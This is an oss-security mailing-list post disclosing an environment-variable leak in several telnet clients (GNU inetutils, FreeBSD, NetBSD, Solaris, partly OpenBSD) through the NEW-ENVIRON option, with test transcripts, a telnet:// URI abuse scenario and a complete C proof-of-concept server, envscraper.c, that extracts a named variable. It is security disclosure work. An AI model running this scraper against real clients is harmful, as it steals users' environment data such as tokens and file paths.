Received: (qmail 22228 invoked by uid 550); 13 Mar 2026 13:06:44 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 17643 invoked from network); 13 Mar 2026 04:36:49 -0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=risingedge.co.za; s=xneelo; h=Content-Transfer-Encoding:MIME-Version:
	Message-Id:Date:Subject:Cc:To:From:reply-to:sender:bcc:in-reply-to:references
	:content-type; bh=YzCj613ITwnyQh5qqHM9aPkXErrBrbk4uvqucgBx/rE=; b=YGqkm5eXIPf
	oWDk0LfnKy/dlNaGE9j3SpOCscl9sF7RlZ2LoHrtFk72VKObuASYL/7mvLYhT5/ZVz96ie0wqasli
	aavBU7C/Po8l2NsuZmrQwLy4mvUlaJzopSkrUlJueaUaMZ77iCb9FjM2YjghCDBlEN6/IUVg1BGF4
	Wf9bHqw+FRBntHgowjKTpEriWw4dKrHDRWB4XA09L+mUGg1ky5/APfLHepgMhR4X1xpfkNEs2eGij
	UqS3nY3t0OdTKc+lH6a9dbAUvH6tlMA66ylJf4v/KfgDokYY8cSCQ+xsgSnB7/NeIk2p+LvixHvbg
	mMFHpWtZUvv9cQ8jTybpw/g==;
From: Justin Swartz <justin.swartz@risingedge.co.za>
To: oss-security@lists.openwall.com
Cc: justin.swartz@risingedge.co.za
Date: Fri, 13 Mar 2026 06:37:38 +0200
Message-Id: <20260313043738.8600-1-justin.swartz@risingedge.co.za>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
X-Authenticated-Sender: justin.swartz@risingedge.co.za
X-Virus-Scanned: Clear
X-Originating-IP: 188.40.1.173
X-SpamExperts-Domain: risingedge.co.za
X-SpamExperts-Username: 
Authentication-Results: host-h.net; auth=pass (login) smtp.auth=@risingedge.co.za
X-SpamExperts-Outgoing-Class: ham
X-SpamExperts-Outgoing-Evidence: SB/global_tokens (1.82681002159e-06)
X-Recommended-Action: accept
X-Filter-ID: 9kzQTOBWQUFZTohSKvQbgI7ZDo5ubYELi59AwcWUnuWKSDeY3hp+vb+HOZIAooMsm84U8qvNgyn3
 Nrj+zhzsXCu2SmbhJN1U9FKs8X3+Nt0Io1idSgCc/506nnISAkPANvJkKIxakGlbxi+ggiqZlxxH
 xN7wu8yGEPLNcyeaFTizxIHpCzB2OB8yRFlPF0+lBMmyNbDn7R5kilAhwr3KtFb3AgNUGvQRnUF+
 Lycvfx+SVUSshQka8VpEeqGYZUq9E9d2wzwQxbXkmlRlwduBj4hSnw9YyoGHx/ukuag1WKBLWDaO
 GAC1PCRtpOZuVuRfKVFCXTS2zVmMeFsPQMyMp5ya4EnB7foI3WDAWEIqQR42kI22V3+6/8VpCe4k
 l4rBoCO4qTTFh+YfFhnsJKW+4WQB2ErbcicDbPONrkjWuIPYD7NLT3TvBNLPf1+s3ESe+GGIqRjk
 Mz2jvqlQOSgIbZYXe09ZChkDAMu2PHnVGttI4VYmKqLHRkT4sVEWlJ78/7nDSwBEu+YXHq01o7B/
 3GwVXO50BuTihrUiUr+Ne0YZ65izuSH3Vd+BZY/UABzhKIsCwHdisqa3XYpUFef6XBhCyCR8TR7A
 2A1RjmVk5Dn754M/6XZtxWBJyFpYKw5HulcxfjgPaxyVnP1Aft/+GaxlS6+B2s5mvDv0wBb3rl9o
 h9VoIekQHpwUfpYnEThmjW/Fx0L2hhSM73XTljgYXZ71EZuJYpchWODQbuQaiI7BOMkMf4uKHVpc
 c3gGgbfHsCNs1jFwqfOkZY1nHoGW2t34D0ncCVPIs0IwkMLcDtTdu3bDCtnFwDSO/YYNq4Wa55RG
 8/vjrz5/4Qa1aRJkveWebEfs93jFPozJgYh2i8zXAe1nnNXEObAjucee/khXLOYwP1gLqzy15dqS
 tpEStcUR4NERTpkOx4tCrkomCeQOVcZv254a1SspgLrZBCX/7m7aY40UcfQNPkuAFE+3ReuO5TcD
 eKjrEmYPn2IVWRtNraRqlji5YPwewO5/KkP6IxveHhXeOux2QuEz28dTElO2HCMQxPIbiVEykbg/
 Bgyi8gnN+VQO0b1vxxohqsS9jN42siblfAUigsg3mLXaw06cayZhS1ESlic0PdtE+o8=
X-Report-Abuse-To: spam@antispamquarantine.host-h.net
X-Complaints-To: abuse@antispammaster.host-h.net
Subject: [oss-security] Some telnet clients leak environment variables

Greetings,

In a recent oss-security thread [1] regarding the CVE-1999-0073 [2]
regression in GNU inetutils telnetd, Solar Designer suggested [3]
that the inetutils telnet client may not have been subject to an
adequate fix for CVE-2005-0488. [4]

If this were the case, then it would mean that a telnet server could 
possibly read a client's environment variables with the NEW-ENVIRON
option and the SEND ENV_USERVAR command.

So, I wrote a simple proof of concept (attached below this message
as envscraper.c) to find out if I could convince a telnet client to
tell me the value of an arbitrary environment variable.


SUMMARY OF AFFECTED CLIENTS

  GNU inetutils 2.7.33 [VULNERABLE]

  The client unconditionally leaks any requested environment
  variable. No export required.

  Debian's switch from netkit telnet to inetutils telnet during
  the Debian 12 (Bookworm) cycle reintroduced this vulnerability
  to the default installation.

  Debian derived distributions such as Ubuntu, Devuan, and mobile
  environments such as Termux are also at risk.
  

  FreeBSD 16.0-CURRENT & NetBSD 11.0-RC2 [VULNERABLE]
  
  Both clients unconditionally leak any requested environment
  variable. No export required.
  

  OpenBSD 7.8 [PARTIAL LEAKAGE]
  
  The client blocks most variables which have not been explicitly
  exported, but potentially sensitive variables such as DISPLAY,
  XAUTHORITY and PRINTER are leaked without prior export.
  

  Oracle Solaris 11.4 [VULNERABLE]
  
  The client unconditionally leaks any requested environment
  variable. No export required.

  It's also worth noting that it replaces the DISPLAY variable
  with just the local hostname, effectively dropping the display
  (and optional screen) number.


POTENTIAL ABUSE VIA telnet:// URI SCHEME HANDLING

  This issue may also be triggered through web browsers which
  support the telnet:// URI scheme. Some terminal-based web
  browsers, such as Lynx and Elinks, pass the address and port
  declared in a telnet:// URI directly to the system's native
  telnet binary.
  
  Because the spawned telnet process inherits the browser's
  environment, an attacker may read these variables by leading
  the user to follow either a direct link to a telnet://
  URI, or to an HTTP 3xx redirect that points to a telnet://
  URI instead.
  
  No other browsers or HTTP clients that support this scheme
  were tested.


TEST DATA

  The following tests were conducted against the native telnet
  clients of the respective operating systems.


-------------------------------------------- GNU inetutils 2.7.33 [VULNERABLE]

$ telnet -V
telnet (GNU inetutils) 2.7.33-81d43
Copyright (C) 2026 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <https://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Written by many authors.


# Unconditionally leaks requested variables ...

$ ./envscraper | xxd
00000000: fffb 27ff fa27 0003 4744 5052 0156 494f  ..'..'..GDPR.VIO
00000010: 4c41 5445 44ff f0                        LATED..

$ GDPR=VIOLATED telnet 127.0.0.1 23232
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
Connection closed by foreign host.
 

-------------------------------------------- FreeBSD 16.0-CURRENT [VULNERABLE]

root@freebsd:/tmp # uname -a
FreeBSD freebsd 16.0-CURRENT FreeBSD 16.0-CURRENT #0 main-n284417-8f72d933cd18
:Mon Mar  9 11:57:15 UTC 2026     root@releng3.nyi.freebsd.org:/usr/obj/usr/sr
c/amd64.amd64/sys/GENERIC amd64


# Unconditionally leaks requested variables ...

root@freebsd:/tmp # ./envscraper GDPR | hexdump -C
00000000  ff fb 27 ff fa 27 00 03  47 44 50 52 01 56 49 4f  |..'..'..GDPR.VIO|
00000010  4c 41 54 45 44 ff f0                              |LATED..|
00000017

root@freebsd:/tmp # GDPR=VIOLATED telnet 127.0.0.1 23232
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
Connection closed by foreign host.


------------------------------------------------- NetBSD 11.0-RC2 [VULNERABLE]

netbsd# uname -a
NetBSD netbsd 11.0_RC2 NetBSD 11.0_RC2 (GENERIC) #0: Wed Mar  4 21:02:00 UTC 2
026  mkrepro@mkrepro.NetBSD.org:/usr/src/sys/arch/amd64/compile/GENERIC amd64


# Unconditionally leaks requested variables ...

netbsd# ./envscraper GDPR | hexdump -C
00000000  ff fb 27 ff fa 27 00 03  47 44 50 52 01 56 49 4f  |..'..'..GDPR.VIO|
00000010  4c 41 54 45 44 ff f0                              |LATED..|
00000017

netbsd# GDPR=VIOLATED telnet 127.0.0.1 23232
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
Connection closed by foreign host.


------------------------------------------------ OpenBSD 7.8 [PARTIAL LEAKAGE]

openbsd# uname -a
OpenBSD openbsd.my.domain 7.8 GENERIC#54 amd64


# Blocks most variables which have not been explicitly exported ...

openbsd# ./envscraper GDPR | hexdump -C
00000000  ff fb 27 ff fa 27 00 03  47 44 50 52 ff f0        |..'..'..GDPR..|
0000000e

openbsd# GDPR=VIOLATED telnet 127.0.0.1 23232
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
Connection closed by foreign host.


# But will leak those variables if they're explicitly exported ...

openbsd# ./envscraper GDPR | hexdump -C 
00000000  ff fb 27 ff fa 27 00 03  47 44 50 52 01 56 49 4f  |..'..'..GDPR.VIO|
00000010  4c 41 54 45 44 ff f0                              |LATED..|
00000017

openbsd# GDPR=VIOLATED telnet                    
telnet> environ export GDPR
telnet> open 127.0.0.1 23232
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
Connection closed by foreign host.


# Leaks the client's DISPLAY (with FQDN) without explicit export ...

openbsd# ./envscraper DISPLAY | hexdump -C 
00000000  ff fb 27 ff fa 27 00 00  44 49 53 50 4c 41 59 01  |..'..'..DISPLAY.|
00000010  6f 70 65 6e 62 73 64 2e  6d 79 2e 64 6f 6d 61 69  |openbsd.my.domai|
00000020  6e 3a 31 2e 30 ff f0                              |n:1.0..|
00000027

openbsd# DISPLAY=:1.0 telnet 127.0.0.1 23232 
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
Connection closed by foreign host.


# Leaks the client's XAUTHORITY without explicit export ...

openbsd# ./envscraper XAUTHORITY | hexdump -C
00000000  ff fb 27 ff fa 27 00 03  58 41 55 54 48 4f 52 49  |..'..'..XAUTHORI|
00000010  54 59 01 2f 68 6f 6d 65  2f 75 73 65 72 2f 2e 58  |TY./home/user/.X|
00000020  61 75 74 68 6f 72 69 74  79 ff f0                 |authority..|
0000002b

openbsd# XAUTHORITY="/home/user/.Xauthority" telnet 127.0.0.1 23232
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
Connection closed by foreign host.


# Leaks the client's PRINTER without explicit export ...

openbsd# ./envscraper PRINTER | hexdump -C
00000000  ff fb 27 ff fa 27 00 00  50 52 49 4e 54 45 52 01  |..'..'..PRINTER.|
00000010  6e 6f 66 61 78 67 69 76  65 6e ff f0              |nofaxgiven..|
0000001c

openbsd# PRINTER="nofaxgiven" telnet 127.0.0.1 23232                
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
Connection closed by foreign host.


--------------------------------------------- Oracle Solaris 11.4 [VULNERABLE]

root@solaris:/tmp# uname -a
SunOS solaris 5.11 11.4.0.15.0 i86pc i386 i86pc


# Unconditionally leaks requested variables ...

root@solaris:/tmp# ./envscraper GDPR | xxd
00000000: fffb 27ff fa27 0003 4744 5052 0156 494f  ..'..'..GDPR.VIO
00000010: 4c41 5445 44ff f0                        LATED..

root@solaris:/tmp# GDPR=VIOLATED telnet 127.0.0.1 23232
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
Connection to 127.0.0.1 closed by foreign host.


# Leaks the client's local hostname via DISPLAY without explicit export ...

root@solaris:/tmp# ./envscraper DISPLAY | xxd
00000000: fffb 27ff fa27 0000 4449 5350 4c41 5901  ..'..'..DISPLAY.
00000010: 736f 6c61 7269 73ff f0                   solaris..

root@solaris:/tmp# DISPLAY=:1.0 telnet 127.0.0.1 23232
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
Connection to 127.0.0.1 closed by foreign host.


------------------------------------------------------------------------------

This commentary and the attached proof of concept are released into the
public domain.


Regards,
Justin


--- Links ---
[1] https://www.openwall.com/lists/oss-security/2026/02/24/1
[2] https://nvd.nist.gov/vuln/detail/CVE-1999-0073
[3] https://www.openwall.com/lists/oss-security/2026/03/08/4
[4] https://nvd.nist.gov/vuln/detail/cve-2005-0488


--- BEGIN envscraper.c ---
/*
 *  Attempt to extract an environment variable from a telnet client.
 *  $ cc -o envscraper envscraper.c -Wall -Werror -Wextra -pedantic
 */

#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define IP_ADDRESS   htonl(0x7f000001)
#define PORT         htons(23232)

#define IAC          "\xff"
#define DO           "\xfd"
#define SB           "\xfa"
#define SE           "\xf0"
#define NEW_ENVIRON  "\x27"
#define SEND         "\x01"
#define USERVAR      "\x03"

static int server = -1, client = -1;

static void usage(FILE *stream)
{
	fprintf(stream, "usage: envscraper VARIABLE\n");
}

static int setup(void)
{
	int reuse = 1;
	struct sockaddr_in address = { .sin_family = AF_INET };
	socklen_t length = sizeof(address);

	server = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (server == -1) {
		perror("socket");
		return -1;
	}	

	if (setsockopt(server, SOL_SOCKET,
	               SO_REUSEADDR, &reuse, sizeof(reuse)) == -1) {
		perror("setsockopt: SO_REUSEADDR");
		return -1;
	}

	address.sin_addr.s_addr = IP_ADDRESS;
	address.sin_port        = PORT;

	if (bind(server, (struct sockaddr *)&address, sizeof(address)) == -1) {
		perror("bind");
		return -1;
	}

	if (listen(server, 1) == -1) {
		perror("listen");
		return -1;
	}

	client = accept(server, (struct sockaddr *)&address, &length);
	if (client == -1) {
		perror("accept");
		return -1;
	}	

	return 0;
}

static int serve(char *variable)
{
	const char accost[] = IAC DO NEW_ENVIRON;
	const char demand[] = IAC SB NEW_ENVIRON SEND USERVAR;
	const char end[]    = IAC SE;

	int count;
	size_t total = 0;
	char ransom[1024];
	struct timeval wait = { .tv_sec = 1 };

	if (send(client, accost, sizeof(accost) - 1, 0) == -1) {
		perror("send: accost");
		return -1;
	}

	if (send(client, demand, sizeof(demand) - 1, 0) == -1) {
		perror("send: demand");
		return -1;
	}

	if (send(client, variable, strlen(variable), 0) == -1) {
		perror("send: variable");
		return -1;
	}

	if (send(client, end, sizeof(end) - 1, 0) == -1) {
		perror("send: end");
		return -1;
	}

	if (setsockopt(client, SOL_SOCKET,
	               SO_RCVTIMEO, (const char *)&wait, sizeof(wait)) == -1) {
		perror("setsockopt: SO_RCVTIMEO");
		return -1;
	}

	while (total < sizeof(ransom)) {
		count = recv(client, ransom + total, sizeof(ransom) - total, 0);

		if (count == 0)
			break;

		if (count == -1) {
			if (errno == EWOULDBLOCK || errno == EAGAIN)
				break;

			perror("recv: ransom");
			return -1;
		}

		total += count;
	}

	if (write(STDOUT_FILENO, ransom, total) == -1) {
		perror("write: stdout");
		return -1;
	}

	return 0;
}

static void cleanup(void)
{
	if (client > -1)
		close(client);

	if (server > -1)
		close(server);
}

int main(int argc, char *argv[])
{
	if (argc != 2) {
		usage(stderr);
		return EXIT_FAILURE;
	}

	atexit(cleanup);

	if (setup() == -1)
		return EXIT_FAILURE;

	if (serve(argv[1]) == -1)
		return EXIT_FAILURE;

	return EXIT_SUCCESS;
}
--- END envscraper.c ---
